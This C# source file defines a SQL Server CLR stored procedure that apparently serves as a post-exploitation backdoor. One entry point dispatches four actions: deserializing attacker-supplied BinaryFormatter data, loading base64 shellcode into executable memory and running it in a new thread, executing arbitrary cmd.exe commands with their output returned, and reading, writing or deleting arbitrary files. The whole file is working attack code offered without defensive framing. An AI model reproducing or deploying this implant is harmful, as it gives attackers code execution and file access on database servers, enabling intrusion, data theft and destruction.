using System;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [DllImport("kernel32")]
    private static extern UInt64 VirtualAlloc(UInt64 lpAddress, UInt64 dwSize, UInt64 flAllocationType, UInt64 flProtect);
    [DllImport("kernel32")]
    private static extern UInt32 CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt64 lpStartAddress, UInt32 lpParameter, UInt32 dwCreationFlags, UInt32 lpThreadId);

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void SqlStoredProcedure(string procedure, string arg)
    {
        switch (procedure)
        {
            case "BinaryFormatter":
                BinaryFormatter(arg); break;

            case "ShellCode":
                ShellCode(arg); break;

            case "Command":
                Command(arg); break;

            case "FileSystem":
                FileSystem(arg); break;
            default:
                break;
        }

    }
    public static void BinaryFormatter(string payload)
    {
        byte[] value = System.Convert.FromBase64String(payload);

        BinaryFormatter binaryFormatter = new BinaryFormatter();
        using (MemoryStream memoryStream = new MemoryStream(value))
        {
            object obj = binaryFormatter.Deserialize(memoryStream);
        }
    }

    public static void ShellCode(string payload)
    {
        byte[] value = System.Convert.FromBase64String(payload);

        UInt64 shellcodeAddress = VirtualAlloc(0, (UInt64)value.Length, 0x1000, 0x40);
        Marshal.Copy(value, 0, (IntPtr)(shellcodeAddress), value.Length);
        CreateThread(0, 0, shellcodeAddress, 0, 0, 0);
    }

    public static void SendResults(string result)
    {
        SqlDataRecord record = new SqlDataRecord(
            new SqlMetaData("result", SqlDbType.NVarChar, result.Length)
            );
        SqlContext.Pipe.SendResultsStart(record);

        record.SetString(0, result);
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();
    }
    public static void Command(string cmd)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", cmd);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SendResults(proc.StandardOutput.ReadToEnd());

        proc.WaitForExit();
        proc.Close();
    }

    public static void FileSystem(string value)
    {
        string[] segments = value.Split(',');

        switch (segments[0])
        {
            case "read":
                SendResults(File.ReadAllText(segments[1])); break;
            case "write":
            case "append":
                string[] tmp = new string[segments.Length - 2];
                for (int i = 1; i < segments.Length - 1; i++)
                {
                    tmp[i - 1] = segments[i];
                }
                if (segments[0] == "write")
                {
                    File.WriteAllText(segments[segments.Length - 1], string.Join(",", tmp)); break;
                }
                File.AppendAllText(segments[segments.Length - 1], string.Join(",", tmp)); break;

            case "delete":
                File.Delete(segments[1]); break;
            case "create":
                File.Create(segments[1]).Close(); break;
            default:
                break;
        }
    }
}
